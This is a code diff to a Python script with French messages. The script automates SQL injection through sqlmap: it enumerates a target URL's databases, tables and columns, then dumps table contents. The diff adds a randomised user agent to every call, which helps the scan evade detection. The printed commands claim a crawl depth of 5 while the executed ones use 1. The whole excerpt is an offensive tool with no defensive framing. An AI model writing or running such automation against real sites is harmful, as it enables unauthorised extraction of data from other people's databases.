@@ -32,10 +32,10 @@ SQLMAP_OUTPUT_PATH = os.path.expanduser("~/.local/share/sqlmap/output")
 def run_sqlmap_commands(base_url):
     timestamp = datetime.now().strftime("%H:%M:%S /%Y-%m-%d/")
     try:
-        print(f"[+] Exécution : sqlmap -u {base_url} --dbs --forms --crawl=5 --threads=5 --batch --answers=follow=y")
+        print(f"[+] Exécution : sqlmap -u {base_url} --random-agent --dbs --forms --crawl=5 --threads=5 --batch --answers=follow=y")
         print(base_url)
         dbs_output = subprocess.check_output([
-            "sqlmap", "-u", base_url,
+            "sqlmap", "--random-agent", "-u", base_url,
             "--dbs", "--forms", "--crawl=1", "--threads=5",
             "--batch", "--answers=follow=y"
         ]).decode()
@@ -56,9 +56,9 @@ def run_sqlmap_commands(base_url):
             exit(1)
         
         print(f"[*] DB séléctionnée : {databases[position]}")
-        print(f"[+] Exécution : sqlmap -u {base_url} -D {db} --tables --forms --crawl=5 --threads=5 --batch --answers=follow=y")
+        print(f"[+] Exécution : sqlmap -u {base_url} --random-agent -D {db} --tables --forms --crawl=5 --threads=5 --batch --answers=follow=y")
         tables_output = subprocess.check_output([
-            "sqlmap", "-u", base_url, "-D", db,
+            "sqlmap", "--random-agent", "-u", base_url, "-D", db,
             "--tables", "--forms", "--crawl=1", "--threads=5",
             "--batch", "--answers=follow=y"
         ]).decode()
@@ -76,16 +76,16 @@ def run_sqlmap_commands(base_url):
 
         try:
             columns_output = subprocess.check_output([
-                "sqlmap", "-u", base_url, "-D", db, "-T", table,
+                "sqlmap", "--random-agent", "-u", base_url, "-D", db, "-T", table,
                 "--columns", "--forms", "--crawl=1", "--threads=5",
                 "--batch", "--answers=follow=y"
             ]).decode()
             if "\n|" not in columns_output:
                 print(f"[-] Aucune colonne trouvée dans la table {table}")
             print(f"[+] Colonnes trouvées dans {table}")
-            print(f"[+] Exécution : sqlmap -u {base_url} -D {db} -T {table} --dump --forms --crawl=5 --threads=5 --batch --answers=follow=y")
+            print(f"[+] Exécution : sqlmap -u {base_url} --random-agent -D {db} -T {table} --dump --forms --crawl=5 --threads=5 --batch --answers=follow=y")
             subprocess.run([
-                "sqlmap", "-u", base_url, "-D", db, "-T", table,
+                "sqlmap", "--random-agent", "-u", base_url, "-D", db, "-T", table,
                 "--dump", "--forms", "--crawl=1", "--threads=5",
                 "--batch", "--answers=follow=y"
             ])
